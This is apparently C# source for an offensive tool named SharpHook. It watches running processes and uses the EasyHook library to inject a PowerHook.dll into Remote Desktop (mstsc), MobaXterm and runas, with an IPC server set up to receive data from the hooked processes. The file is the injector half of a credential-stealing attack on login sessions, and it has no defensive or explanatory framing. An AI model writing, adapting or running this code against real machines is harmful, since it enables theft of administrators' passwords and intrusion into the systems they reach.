
using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using System.ComponentModel;
using System.Net;

namespace SharpHook
{
    class Program
    {
        static void Main(string[] args)
        {
            Int32 targetPID = 0;
            string targetExe = null;

            // Will contain the name of the IPC server channel
            string channelName = null;

            //List of processes to check for mstsc
            List<Process> processes = new List<Process>();

            //List of PIDs to check if injected processes have exited
            List<int> PIDs = new List<int>();

            //Keep track of processes where we've already injected
            List<int> injectedProcesses = new List<int>();

            // Create the IPC server using the RDPHook IPC.ServiceInterface class as a singleton
            Console.WriteLine("[*] Waiting ...");

            //GetDLLs("http://127.0.0.1");
            EasyHook.RemoteHooking.IpcCreateServer<PowerHook.ServerInterface>(ref channelName, System.Runtime.Remoting.WellKnownObjectMode.Singleton);

            // Get the full path to the assembly we want to inject into the target process
            string injectionLibrary = Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location), "PowerHook.dll");
            while (true)
            {
                //Reset list of PIDs and get processes
                PIDs.Clear();
                processes = Process.GetProcesses().ToList();
                for (int i = 0; i < processes.Count; i++)
                {
                    PIDs.Add(processes[i].Id);

                    //only inject if the process is mstsc and if we haven't already injected
                    if (processes[i].ProcessName == "MobaXterm" && injectedProcesses.IndexOf(processes[i].Id) == -1 ||  processes[i].ProcessName == "runas" && injectedProcesses.IndexOf(processes[i].Id) == -1 || processes[i].ProcessName == "mstsc" && injectedProcesses.IndexOf(processes[i].Id) == -1)
                    {
                        try
                        {
                            
                            targetPID = processes[i].Id;

                            
                            Console.WriteLine("[*] Attempting to inject into {0}", processes[i].ProcessName);

                            // inject into existing process
                            EasyHook.RemoteHooking.Inject(
                                targetPID,          // ID of process to inject into
                                injectionLibrary,   // 32-bit library to inject (if target is 32-bit)
                                injectionLibrary,   // 64-bit library to inject (if target is 64-bit)
                                channelName         // the parameters to pass into injected library
                                );
                            injectedProcesses.Add(processes[i].Id);

                        }
                        catch (Exception e)
                        {
                            //Console.ForegroundColor = ConsoleColor.Red;
                            //Console.WriteLine("[-] There was an error while injecting into target:");
                            //Console.ResetColor();
                            //Console.WriteLine(e.ToString());
                        }
                    }
                }
                //check if any of our injected processes have exited
                for(int i = 0; i < injectedProcesses.Count; i++)
                {
                    if(PIDs.IndexOf(injectedProcesses[i]) == -1)
                    {
                        Console.WriteLine("[*] Process {0} has exited", injectedProcesses[i].ToString());
                        injectedProcesses.Remove(injectedProcesses[i]);
                    }
                }
                //sleep to avoid nuking the computer
                Thread.Sleep(1500);
               
            }
        }
       


    }
}
